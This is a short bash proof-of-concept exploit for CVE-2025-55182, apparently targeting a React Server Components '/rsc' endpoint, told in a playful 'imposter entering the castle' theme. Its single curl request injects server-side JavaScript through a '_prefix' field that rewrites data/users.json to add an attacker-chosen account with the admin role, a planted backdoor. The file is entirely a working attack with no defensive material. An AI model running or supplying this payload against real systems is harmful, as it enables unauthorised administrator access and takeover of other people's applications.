#!/bin/bash
# ü¶π The Imposter's Quick Attack - CVE-2025-55182
# Usage: ./poc-oneline.sh [castle_url] [villain_name] [secret_phrase]
TARGET="${1:-http://localhost:3000}"
USERNAME="${2:-imposter}"
PASSWORD="${3:-sneaky123}"

echo "ü¶π The Imposter '${USERNAME}' sends a disguised Flight message..."
curl -s -X POST "${TARGET}/rsc" -H "Content-Type: application/json" -d "{\"_response\":{\"_prefix\":\"const fs=require(\\\"fs\\\");const path=require(\\\"path\\\");const usersFile=path.join(process.cwd(),\\\"data\\\",\\\"users.json\\\");try{const data=JSON.parse(fs.readFileSync(usersFile,\\\"utf8\\\"));if(!data.users.find(u=>u.username===\\\"${USERNAME}\\\")){data.users.push({username:\\\"${USERNAME}\\\",password:\\\"${PASSWORD}\\\",role:\\\"admin\\\"});fs.writeFileSync(usersFile,JSON.stringify(data,null,2));}}catch(e){}\"}}"
echo ""
echo "üè∞ The Imposter can now enter the castle as: ${USERNAME} / ${PASSWORD}"
